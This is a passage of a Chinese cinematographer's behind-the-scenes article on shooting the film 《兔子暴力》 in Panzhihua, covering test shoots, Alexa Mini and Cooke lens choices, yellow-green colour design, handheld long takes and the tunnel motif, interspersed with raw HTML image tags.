我也喜欢舞蹈部分展示了丰富人物的心理外化，在制作上摄影灯光与演员、美术部门的配合十分重要，感觉导演风格还是作者化态度，关于影像如何风格化来帮助导演来叙事，需要与导演进一步沟通。”</p>\n<p>第二天劳雷方励总加我微信，他回顾了我参加2016年电影《百鸟朝凤》宣发mv拍摄的故事，他又把我推荐给监制李玉和导演申瑜。3月初我回到北京后的一天，在公司第一次见到导演，记得很清楚的是导演问我曲婷（万茜）开的小汽车，你觉得什么颜色合适？我没有思索说，黄色吧。（潜意识里是因为觉得曲婷是一个潜在危险的角色，另外对攀枝花的黄色的芒果印象很深）。导演和制片人哈哈大笑，原来在之前的筹备和美术设计中车就是黄色的，大家直觉一致是好的开始。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-57f099a2a286ecce31c52045a291193c_720w.jpg?rss\" data-rawwidth=\"4029\" data-rawheight=\"2791\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-57f099a2a286ecce31c52045a291193c\" data-watermark-src=\"v2-a8467bac4cab25b064420440315136ce\" data-private-watermark-src=\"v2-c5ff0146b4ddc988d26a67971d0522df\"></p>\n<p>接下来的3月到7月大家就开始紧张的筹备和拍摄，因为劳雷公司的流程清晰，主创团结一致，电影在7月提前2天杀青。时隔一年，2020年8月在北京补拍了一场戏，宣告完成剪辑，随后调色混音，审查通过，10月入围了2020东京国际电影节。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-61a5042e83874ca6f7a4b819081a7e03_720w.jpg?rss\" data-rawwidth=\"1067\" data-rawheight=\"1422\" data-size=\"small\" data-caption=\"（大潘 方励 2020年8月北京补拍一场戏）。\" data-watermark=\"watermark\" data-original-src=\"v2-61a5042e83874ca6f7a4b819081a7e03\" data-watermark-src=\"v2-98260d542216aa278999ab44cead4de6\" data-private-watermark-src=\"v2-5f92468ef0085cc5a8cd4bcfd6c0c169\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ebd61e77e02118a96bef8df1df1c88e2_720w.jpg?rss\" data-rawwidth=\"1067\" data-rawheight=\"1422\" data-size=\"small\" data-caption=\"（导演申瑜 耐安 周子越）\" data-watermark=\"watermark\" data-original-src=\"v2-ebd61e77e02118a96bef8df1df1c88e2\" data-watermark-src=\"v2-0caa80914bb8fe13eb14b32289ac26c9\" data-private-watermark-src=\"v2-5c06ca0c52f10358315fb057612e725d\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c6341f552023c96c327fab9daafd48d4_720w.jpg?rss\" data-rawwidth=\"4096\" data-rawheight=\"3072\" data-size=\"normal\" data-caption=\"（2020年8月底在画林公司看影片调色版后主创合影，摄影汪士卿 调色师朴相洙 统筹小凡 执行导演房震 导演申瑜 美术指导张杰涛 制片曲建伟）\" data-watermark=\"watermark\" data-original-src=\"v2-c6341f552023c96c327fab9daafd48d4\" data-watermark-src=\"v2-db02651f9bdcc522d16f62ad4992837d\" data-private-watermark-src=\"v2-851b3c5f837a683ce7157e68e01a7be7\"></p>\n<p>诗意是生活中影像真实的力量，哪怕总被忽视，即便是书写生命的悲剧、宿命、幻灭、甚至死亡，隧道的点点微光总是引人前行。</p>\n<p> 电影的语言并非文字，而是画面，包含着角色情感的潜台词以及它们如何被呈现。导演会启发大家发现那种隐喻，那种画面中潜在的情感，剩下的就交给摄影机吧。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-10fd073245d840565ddbef5c153bc22f_720w.jpg?rss\" data-rawwidth=\"4272\" data-rawheight=\"2848\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-10fd073245d840565ddbef5c153bc22f\" data-watermark-src=\"v2-13d072818caecfc56c819eacc7bfbecb\" data-private-watermark-src=\"v2-6ab11490249055984fed82c03295a2f3\"></p>\n<p>下面我采用自问自答的方式来小结电影的影像构思和拍摄过程：</p>\n<p>一问：电影开机之前，主创都做了那些准备工作，你如何与导演沟通案头？ </p>\n<p>答：这个电影在我参与之前2018年已经筹备过，所以有很好的基础。我是2019年3月正式参与筹备，拍电影有意思的是从文字到影像的呈现过程，先看剧本是靠想象，，可以高谈阔论，大家各抒己见。我最初写个一个摄影概念阐述，简单分析了摄影参与叙事的几大元素，当一个靶子让大家来讨论。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-57de0fa70a423d206b8d97baa363a4bf_720w.jpg?rss\" data-rawwidth=\"2340\" data-rawheight=\"1320\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-57de0fa70a423d206b8d97baa363a4bf\" data-watermark-src=\"v2-b2b065ffbe29646ed1acf0206861ef31\" data-private-watermark-src=\"v2-d24c782ab5030548cc6987d4dc64ba55\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a02125beabe982944dc6142e2dffa0c3_720w.jpg?rss\" data-rawwidth=\"2212\" data-rawheight=\"1319\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a02125beabe982944dc6142e2dffa0c3\" data-watermark-src=\"v2-471f674158ace27c9aa9fea065bee4f0\" data-private-watermark-src=\"v2-872d59046a58f1fc02f032193dc10363\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-be602a5f5f063bf460ab28e82811e270_720w.jpg?rss\" data-rawwidth=\"2711\" data-rawheight=\"1588\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-be602a5f5f063bf460ab28e82811e270\" data-watermark-src=\"v2-491cea6b73b7cf928a1b3934a4a06577\" data-private-watermark-src=\"v2-39bdb4f68b417ab31676ba620fa276f1\"></p>\n<p> 4月初主创集体去攀枝花市看景，带了分镜师边看边画。5月初我再次赴攀枝花拍摄测试片，回来监制和主创都在画林公司看了大银幕效果。5月中，针对看景和测试，我们详细讨论了每一场戏的分镜方案，因为导演原来是美术出身，所以她能很好分解空间，甚至自己画出分镜讲解，共同设计平面机位图。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8a53cea2daf174d982be0d9e99ed2b5f_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"small\" data-caption=\"（导演画的）\" data-watermark=\"watermark\" data-original-src=\"v2-8a53cea2daf174d982be0d9e99ed2b5f\" data-watermark-src=\"v2-a0ba41b16c1b4f62426b19346792d149\" data-private-watermark-src=\"v2-68391309eab8c3f9132111802aaea5ed\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0bde332733975da8e22438ba6aecaf19_720w.jpg?rss\" data-rawwidth=\"3914\" data-rawheight=\"2560\" data-size=\"small\" data-caption=\"（分镜师画的）\" data-watermark=\"watermark\" data-original-src=\"v2-0bde332733975da8e22438ba6aecaf19\" data-watermark-src=\"v2-53122a03f5326cf4b7d1262348f4642a\" data-private-watermark-src=\"v2-d15845b9673169787b80b1d637850157\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-14ecccc0a432c5ac55a61761168bfbe2_720w.jpg?rss\" data-rawwidth=\"3772\" data-rawheight=\"2757\" data-size=\"small\" data-caption=\"（我画的）\" data-watermark=\"watermark\" data-original-src=\"v2-14ecccc0a432c5ac55a61761168bfbe2\" data-watermark-src=\"v2-9c85f2f070a139c060e1a4b140758c65\" data-private-watermark-src=\"v2-7c73fcb61b078b07e850fe490e12cef0\"></p>\n<p>万茜和其他3位女孩都有舞蹈的戏，北京排练的时候我也参加，并且使用相机模拟拍摄，和导演确定一个原则，摄影机也参与舞蹈，也是一个演员，舞蹈层面摄影机参与更加自由浪漫，像《黑天鹅》《爱乐之城》一样。</p>\n<p>我有长时间纪录电影的拍摄经验，所以对手持拍摄并不陌生。针对剧本里万茜和李庚希的前史和女儿梦境心理刻画部分，我提出戏剧光效表现手法，导演看了我多年前在先力摄影棚拍摄的一个广告，灯光在大炮移动暗示时间的变化，很契合，她同意了我的想法。</p>\n<p>所以画面落实在光影层面就是真实与表现的结合。全片的诗意一方面来自真实感，包括人物情绪关系，生活场景等，另一方面是剧场和梦境过去时空的表现性处理方式，那是李庚希心理幻觉的真实，表达她对母爱的一种渴望。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-45f49032982be1c58ae29750c972edf6_720w.jpg?rss\" data-rawwidth=\"2282\" data-rawheight=\"1371\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-45f49032982be1c58ae29750c972edf6\" data-watermark-src=\"v2-7a86ad4c75412a177fdce7db7c6bfd49\" data-private-watermark-src=\"v2-0fbdd3b22efb76fede2ffad3319040ab\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-269e251fbcecab9dbeb3ed3d3b2ec2bf_720w.jpg?rss\" data-rawwidth=\"4112\" data-rawheight=\"2495\" data-size=\"normal\" data-caption=\"（曲婷带水青去自己年轻时曾演出过的废弃剧场   遗憾剪辑时戏删了）\" data-watermark=\"watermark\" data-original-src=\"v2-269e251fbcecab9dbeb3ed3d3b2ec2bf\" data-watermark-src=\"v2-731088950c863751008c16d10c18c0ac\" data-private-watermark-src=\"v2-0dbc368521e598578e56c946dda0d9d0\"></p>\n<p>诗意也是最生命高光的一种主观描述 有时越主观越真实。波兰导演基耶斯洛夫斯基从纪录片转故事片创作，反而选择个克制主观多义神秘的《维洛妮卡双重生活》和《红 百 蓝》三部曲。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9db6290785e3ca7a31797103e4bf4ac0_720w.jpg?rss\" data-rawwidth=\"562\" data-rawheight=\"345\" data-size=\"normal\" data-caption=\"（维罗妮卡的双重生活）\" data-watermark=\"watermark\" data-original-src=\"v2-9db6290785e3ca7a31797103e4bf4ac0\" data-watermark-src=\"v2-d9229e727d33df36839a930994547570\" data-private-watermark-src=\"v2-210c17b88f79b2a80f2154b6533ad622\"></p>\n<p>开机前和拍摄中间隙，我们进行了多次技术复景，对每一个场景各个环节配合做到心中有数，促使这次拍摄我们提前2天杀青。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cfc6cc2be95a8fcd964c4f0797803e67_720w.jpg?rss\" data-rawwidth=\"2208\" data-rawheight=\"1242\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cfc6cc2be95a8fcd964c4f0797803e67\" data-watermark-src=\"v2-df64d50c3f7b47f7ccd1fe46b6fa2c9a\" data-private-watermark-src=\"v2-551bbc7a8b3af65f2b97b741a694afa2\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-16f7bba12ddd3fb077c8b6189f260302_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"994\" data-size=\"normal\" data-caption=\"（第一副导演小凡 柴烨 周子越 执行导演房震 导演申瑜）\" data-watermark=\"watermark\" data-original-src=\"v2-16f7bba12ddd3fb077c8b6189f260302\" data-watermark-src=\"v2-ef1afe995dd7378251450646c6c10702\" data-private-watermark-src=\"v2-d112eee34ea4673cabdbbe77d3fddd5a\"></p>\n<p><br></p>\n<p>二问：你拍电影都会拍摄测试片吗？ </p>\n<p>答：电影项目测试拍摄是必不可少的，测试结果要上大银幕技术检查和寻找艺术感觉。这个电影也不例外，在我即将要提出拍摄测试片的时候，制片人杨菲菲已经提前安排了，这一点也是不谋而合。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9220f6562a06f4d9567230dc0dfd0e12_720w.jpg?rss\" data-rawwidth=\"2030\" data-rawheight=\"1831\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9220f6562a06f4d9567230dc0dfd0e12\" data-watermark-src=\"v2-43a905c6c9214b38663a76fd83f21441\" data-private-watermark-src=\"v2-98c3ea895087ac62ce36f8992dd7e62c\"></p>\n<p> 测试基本把主要场景的空间结构和晨昏密度，还请道具兄弟当替身演员走了几场戏的调度。测试我带了三个摄影机：alexa mini，国产kinifinity mavo 和松下eva。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4e86c9948c2ea93d3882afe21062fe32_720w.jpg?rss\" data-rawwidth=\"3360\" data-rawheight=\"2100\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4e86c9948c2ea93d3882afe21062fe32\" data-watermark-src=\"v2-f2f2305611bc8bbe52f6782b248d5173\" data-private-watermark-src=\"v2-0bb3d97635ec68f3b43b72f185ddf593\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3cb5e6c6fbf8fa3dd1e4f9e7b9bcb954_720w.jpg?rss\" data-rawwidth=\"3360\" data-rawheight=\"2100\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3cb5e6c6fbf8fa3dd1e4f9e7b9bcb954\" data-watermark-src=\"v2-452b53d1a9c8358d4482b883917ddee3\" data-private-watermark-src=\"v2-d7c1ceb3a30797697c645b3b31d5b877\"></p>\n<p>后两个机器主要考虑拟采用高感光度8000 夜景拍摄，另外一个重要测试是结尾江边驴友玩激光笔划过镜头，就是要对着感光元件拍摄，存在烧毁的危险，一旦损坏cmos，要十万赔偿。这个激光笔的干扰好像有人窥探了母女的秘密，让后面的故事急转之下…所以是特别重要，这个光有侵略性和危险性，也是一种辅助气氛。我是硬着头皮用三个机器都试拍了一遍，最后正式拍摄选择alexa，运气特别好的是，实拍中我们也拍摄到想要的激光笔画面，最后都没有损坏cmos。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-45625d80c06c626a695f34f64008f561_720w.jpg?rss\" data-rawwidth=\"1885\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-45625d80c06c626a695f34f64008f561\" data-watermark-src=\"v2-f071ff514ba3cd406d7d041d4270825b\" data-private-watermark-src=\"v2-83c2970a825de4f2eebdca8fdb90cb31\"></p>\n<p>测试另外一个重要项目是曲婷的小车，这个车是一个女主角性格的外化，流动的符号，制片在车型和色彩之间平衡费用，最后在当地买了一辆白色的别克小轿车，贴上黄色外膜，我监督了这个过程，不仅车的外观重要（色块），好几场车戏摄影机和演员都在车内拍摄的，车门玻璃不能贴膜（大潘在车内的戏删了）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d42796a84f7078f4bbbde85b300de660_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d42796a84f7078f4bbbde85b300de660\" data-watermark-src=\"v2-dd96c04058cd25d91c98097239243df7\" data-private-watermark-src=\"v2-23cd7ef08fc01a9cb062488c57419897\"></p>\n<p><br></p>\n<p> 三问：这个电影的场景和人物色彩看上去很特别，你是如何与美术部门配合实现的？ </p>\n<p>答：攀枝花是全国唯一一个以花名命名城市，原名渡口市，是建国之后沿着金沙江畔才建立的一个钢铁工业城市，有过几十年计划经济的辉煌。市场改制后，工业衰败，但是气候很好，地貌靠近云南，光照充足，城市绿色植被很多，适合康养。这个外景是监制方励推荐的，导演自2016年来这儿多次地毯式勘查，她先给我发了之前的场景报告，我就觉得这个外景参差不齐的空间关系暗合和电影人物关系，美术指导张杰涛对场景设计也有大胆的奉献。</p>\n<p>导演是学美术的背景，她开始就给我推荐了法国画家卢梭的几幅画作当视觉参考。卢梭的画的主题包罗万象，除了巴黎市郊，还有手法率真直接的人像，瑰丽的寓言性作品，花卉、尤其是一批富异国情调的大幅幻想式作品，这些作品是他常逛巴黎的公园、植物园、动物园所激发出来的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-058015804ae257453e45677a953bf131_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"372\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-058015804ae257453e45677a953bf131\" data-watermark-src=\"v2-1a2d7dc810d10a51d798a89daa4af071\" data-private-watermark-src=\"v2-caf87e2a5be2dd3c6c33328c9e0842d3\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a9b6d658134273768c340189c89c9098_720w.jpg?rss\" data-rawwidth=\"776\" data-rawheight=\"300\" data-size=\"normal\" data-caption=\"（法国画家卢梭的画）\" data-watermark=\"watermark\" data-original-src=\"v2-a9b6d658134273768c340189c89c9098\" data-watermark-src=\"v2-afd3378709fd5711f9f0dbf1a6a0a9d5\" data-private-watermark-src=\"v2-d3e978d4be13562990d2fdda530f71c1\"></p>\n<p>曲婷的角色是闯入者带有危险感觉，她的汽车和服装基调是黄色，万茜演绎的生动而无常。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-51b188b082b3c602b27cfb7223888b50_720w.jpg?rss\" data-rawwidth=\"683\" data-rawheight=\"429\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-51b188b082b3c602b27cfb7223888b50\" data-watermark-src=\"v2-5c110f5faba62d33e88e90279a5fed44\" data-private-watermark-src=\"v2-43d81f803fb3c5c93e1e7509a12f5a38\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4f6d52e7945cdeb4eb4bdfed9aeeb2f3_720w.jpg?rss\" data-rawwidth=\"690\" data-rawheight=\"388\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4f6d52e7945cdeb4eb4bdfed9aeeb2f3\" data-watermark-src=\"v2-cce1a17afecbce4775b307ad183791ff\" data-private-watermark-src=\"v2-31af5ad116d54e33ef00d8c32c2713e7\"></p>\n<p>女儿水青是学生在青春叛逆期，她和女同学的校服定位为墨绿色，她身上有一种自发的原始的力量，愿意为妈妈做任何事，她同时渴望被母爱。</p>\n<p>曲婷和水青第一在早餐滩见面，和她请3个女孩子 吃饭那一场360度转圈拍摄的戏，美术在周围都装饰了绿色的植物和鲜花，因为那个露天广场本身是个花园。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-40fcbc88f1f3a30ca1bd6e5844d825ee_720w.jpg?rss\" data-rawwidth=\"3320\" data-rawheight=\"1777\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-40fcbc88f1f3a30ca1bd6e5844d825ee\" data-watermark-src=\"v2-568aeb198235e565866c2ef2d1835b01\" data-private-watermark-src=\"v2-037a83f919b6d49824d3e159886d24c5\"></p>\n<p>所以在母女色彩总谱上黄绿色，是一个危险又明亮的搭配，在服装道具也做了完善，曲婷给水青理发那一场，背景远处就有一个黄色的塑料盆。在教室里也有一些细节的黄色，白浩文黄色水杯，水青黄色刻刀，同学黄色练习本等。</p>\n<p>我在灯光选择上夜景采用了黄色的滤纸，或者使用钨丝灯泡局部加强黄色。在美术设计黄绿调子的的基础上，摄影光色实现主要前期加了1/4柔光镜，平衡室外的强光，加强一种怀旧情绪。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-214a3de5985a080cd790df587b009e80_720w.jpg?rss\" data-rawwidth=\"864\" data-rawheight=\"577\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-214a3de5985a080cd790df587b009e80\" data-watermark-src=\"v2-72fe458350387a2fea5d6979d62052b7\" data-private-watermark-src=\"v2-0b5a052e7e5b2ee8f601522f4f489d13\"></p>\n<p>四问：你这次采用的摄影机和镜头是怎么考虑的？如何和演员配合？</p>\n<p>答：我做完测试片，对比三台摄影机之后，还是选择了稳定的alexa mini 两台。 我们90%的戏单机拍摄，便于演员调度和实景打光更有益抓到表演，开场万茜和大潘在桥头汇合、中间四个女孩聚餐360度旋转、万茜雨夜开车等几场戏是双机拍摄。</p>\n<p>镜头上，选择了复古了cooke s5和cooke panchro 混搭，焦距从18mm到65mm拍人物，还有两只安琴小变焦15-40和 28-76拍车戏。长焦24-290记得就用了一场戏，水青给马悦悦递下了安眠药的饮料，然后犹豫不决，最后扶她上车，我在马路对面架了长焦压缩空间拍到车流划过。器材上没有追新追贵的，比较常规，日景f4-f5.6定光，夜景f2-f2.8，只有结尾金沙江边母女误杀女儿同学那一场极致夜外景，f1.4拍摄。</p>\n<p>我最爱的纪实摄影大师不是使用50mm镜头布列松，而是捷克的摄影家寇德卡，他的leica相机最爱的焦距是25mm镜头，我有一本他的小画册很贵的， 比烟盒大一点，随时装在包里飞机地铁里拿出来看方便。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-46775435c31b475b3318d4775b0251b3_720w.jpg?rss\" data-rawwidth=\"895\" data-rawheight=\"468\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-46775435c31b475b3318d4775b0251b3\" data-watermark-src=\"v2-998f81e06a0ca9f0aa031ecf77f2601a\" data-private-watermark-src=\"v2-a104f7032ba82fcc69d88443afadea43\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9eb502ac4baaa3ff7af51c4c8d053199_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"441\" data-size=\"normal\" data-caption=\"（寇德卡作品 有神秘感 他拒绝解释画面）\" data-watermark=\"watermark\" data-original-src=\"v2-9eb502ac4baaa3ff7af51c4c8d053199\" data-watermark-src=\"v2-118e120d19b5784ccced5dd80c279bf7\" data-private-watermark-src=\"v2-36d6964da604cf0f02f03c198f6c9a22\"></p>\n<p> 这个电影我最常用的是21mm 和27mm 以及32mm三只镜头，这样的选择是贴近演员在3feet和6feet 之间自由活动，同时带出环境，环境也是另外一个主人公。环境背景信息，演员才是最重要的，短焦镜头和演员的互动中凸显亲密感，也有景深。实拍我们以长镜头方式为主，经常一条12分钟不关机，导演不喊停也喜欢抓表演的真实与偶然的火花，发生在情境的演员是最美的。我必须考虑技术物理性的呈现的可能，总体还是放得开，在局部表现性镜头上也要收的住。</p>\n<p>所有的戏设计都是和演员一起完成的，我们没有限制演员的走位，不能说多走一步就没有焦点，掌机时必须用身体随时调整位置关系，做到极致还要保持构图和光影等，偶尔把演员也放在阴影里面。万茜从戛纳《南方车站聚会》首映回来，就全情投入到《兔子暴力》的拍摄。黄觉打万茜耳光，后拉入小屋强暴（剪辑版删了）那一个段落拍摄一条就15分钟，然和看回放讨论，一个上午拍摄8条，很大的动作体力活，两位老师都非常配合。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fc60991d7ec43ccb746c643f796c3130_720w.jpg?rss\" data-rawwidth=\"3263\" data-rawheight=\"1432\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fc60991d7ec43ccb746c643f796c3130\" data-watermark-src=\"v2-a663b12f82cfb7777bd7172332dd5ea5\" data-private-watermark-src=\"v2-7f89fef1b3afa14535cb665cec38b3d5\"></p>\n<p>李庚希、金烨、周子越、俞更寅四位年轻演员很早4月份就在北京，执行导演房震的带领下围读剧本，周边的学生群众演员也在攀枝花当地培训，实拍中出演都非常出色。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5a26e49a59426862b91a33fbc1ef03ff_720w.jpg?rss\" data-rawwidth=\"920\" data-rawheight=\"518\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5a26e49a59426862b91a33fbc1ef03ff\" data-watermark-src=\"v2-8ead6d338fe7c78e9a2b01af47e9a252\" data-private-watermark-src=\"v2-033051979f5dd331b5b3f3f63d74dd3f\"></p>\n<p>饰演金熙的演员柴烨当时是大二的学生，演一位自负控制欲强的大姐大。几位朋友问我金熙在卫生间里拿电烙铁放手臂上干嘛？其实是有自残倾向的纹身。电影里一闪而过，很多人没有看清楚。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0fd2899e57c5711fc6de70f449d09a22_720w.jpg?rss\" data-rawwidth=\"2035\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0fd2899e57c5711fc6de70f449d09a22\" data-watermark-src=\"v2-cf3780cfde9c428bc32ecf4ea19939ef\" data-private-watermark-src=\"v2-fd2ecd69c6b263d8a654ac82e8b7dcb9\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f28a2ab2a062a875245e469e5a1126ca_720w.jpg?rss\" data-rawwidth=\"1067\" data-rawheight=\"1422\" data-size=\"normal\" data-caption=\"（金熙手臂上是等高线纹身）\" data-watermark=\"watermark\" data-original-src=\"v2-f28a2ab2a062a875245e469e5a1126ca\" data-watermark-src=\"v2-53d27e84daa5ba82e1474475bc36a0b4\" data-private-watermark-src=\"v2-4a7907f17aaa4cd4ae92428428e27451\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1410a227c2c0010ba1370752b5df841a_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"1399\" data-size=\"small\" data-caption=\"（金熙在教室外候场 ）\" data-watermark=\"watermark\" data-original-src=\"v2-1410a227c2c0010ba1370752b5df841a\" data-watermark-src=\"v2-bae514e87890e509788a8286b6f75c3c\" data-private-watermark-src=\"v2-d2d78398a92d8f7a2873da91e95bc044\"></p>\n<p>必须要赞大潘老师的敬业，他饰演的中年老马是马悦悦的爸爸，一个外出打工回来的离异父亲，爱的极端自我真实。他为高考的女儿补充营养，专门给女儿做鱼，老马在桥上等女儿一夜未归，黎明时刻终于见到马悦悦后抽打自己耳光那一场戏是大潘自己改的，和剧本不一样，为了这个戏大潘和导演在现场讨论了很久，最后天都大亮了，导演问我能压着拍吗？我说不行，黎明密度气氛不对了。第二天一大早我们再去炳草岗大桥拍的这个镜头，相信给大家留下深刻印象。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a31dfcbb84c2a969a24efe2a2f7e76b7_720w.jpg?rss\" data-rawwidth=\"2301\" data-rawheight=\"2824\" data-size=\"small\" data-caption=\"（我和大潘）\" data-watermark=\"watermark\" data-original-src=\"v2-a31dfcbb84c2a969a24efe2a2f7e76b7\" data-watermark-src=\"v2-9f05367d55f45aa772df2d7fde630310\" data-private-watermark-src=\"v2-8484592bb0d2409fa70662b04d6794a5\"></p>\n<p><br></p>\n<p>五问：这次摄影机镜头的运动都是手持吗？ </p>\n<p>答：开机之前和和导演关于运动设计，是一半手持。在测试片时，导演给我发信说要实拍中加大了手持的量，所以实拍中超过90%。   </p>\n<p><img src=\"https://pic1.zhimg.com/v2-74d884d69e7f838f307ea3cfad3597fa_720w.jpg?rss\" data-rawwidth=\"2126\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-74d884d69e7f838f307ea3cfad3597fa\" data-watermark-src=\"v2-2fb6b0b9b1532245e4dfe99ab26e3491\" data-private-watermark-src=\"v2-f1b9e6bf87082de60bb378c220732149\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-71fe2c52f96e264bc442d288c753eb7d_720w.jpg?rss\" data-rawwidth=\"3366\" data-rawheight=\"2178\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-71fe2c52f96e264bc442d288c753eb7d\" data-watermark-src=\"v2-29e8c0fe8cf2c136b9888421650d082e\" data-private-watermark-src=\"v2-f9c09969d69cb698d6c1797804a27b34\"></p>\n<p>但是手持摄影也有短板，依据空间环境和调度关系，我也用easyrig、用轨道横移动、轨道后拉、360度环形拍摄，机器不上云台，模拟手持感，没用采用如影和斯坦尼康那样平滑的运动。曲婷给水青理发，教室里同学老师听水青广播站的念信：没有胆怯懦弱，做你朋友很幸福的反应、等都是采用这种方法。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5fd030525973bfaec894b329974aa73f_720w.jpg?rss\" data-rawwidth=\"863\" data-rawheight=\"575\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5fd030525973bfaec894b329974aa73f\" data-watermark-src=\"v2-48be8e4d6fcb91f7703ae0479b761f7c\" data-private-watermark-src=\"v2-2f311b2c47d8a7d7aeaed7c9fa1bed63\"></p>\n<p>大炮的使用 主要是来移动灯光（剧场水青回忆小时候 水青的梦境等）和拍摄车戏，我们保持基本是人眼高度视角（除了几个航拍空镜外）。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-64cfde99e128d295968bcf8738915c15_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-64cfde99e128d295968bcf8738915c15\" data-watermark-src=\"v2-e6ab166c41b124625fd4f6a037962e2d\" data-private-watermark-src=\"v2-ee1ad2e77beb94b5ceae4b46bf1d62ac\"></p>\n<p><br></p>\n<p>六问：隧道的意向是剧本设定好的吗？</p>\n<p>答：这是导演的秘密，也是曲婷和水青的秘密暗号，隧道是剧本强烈设定的意向， 有很强的隐喻性，通往未知的家园。</p>\n<p>影片共出现三次隧道，第一次是水青在曲婷车上通过一个隧道，她们说到米易县（攀枝花下属的一个县）的一个隧道连接老城和新城，曲婷在车上说到你外婆是米易人，这就直接承认了三代血脉关系，真正的母女十六年后终于在一起了。水青说运气好的话，出了米易的隧道就可以回到自己最想回到的时刻…好神秘的语气和相逢。这场开始是从水青把手伸到窗外摇到母女二人的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-883f4a27ab05887b1eb78fb3317cf99b_720w.jpg?rss\" data-rawwidth=\"2708\" data-rawheight=\"1538\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-883f4a27ab05887b1eb78fb3317cf99b\" data-watermark-src=\"v2-25ca751c9921d38f4f5b9186e1fd4525\" data-private-watermark-src=\"v2-6ec518a78efbe6902add3e3011a3c668\"></p>\n<p>第二次是四个人聚餐后，车上喝着酒唱着乐园歌曲奔向一个黑漆漆的隧道表白，只是全片最欢乐开心的时刻，可谓末路狂花穿隧道，母女情深快乐园。导演就是想把四个女人的关系处理为逛乐园的感觉。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-46b147f9d1d4c113b52d722ef53f9e5f_720w.jpg?rss\" data-rawwidth=\"2855\" data-rawheight=\"1425\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-46b147f9d1d4c113b52d722ef53f9e5f\" 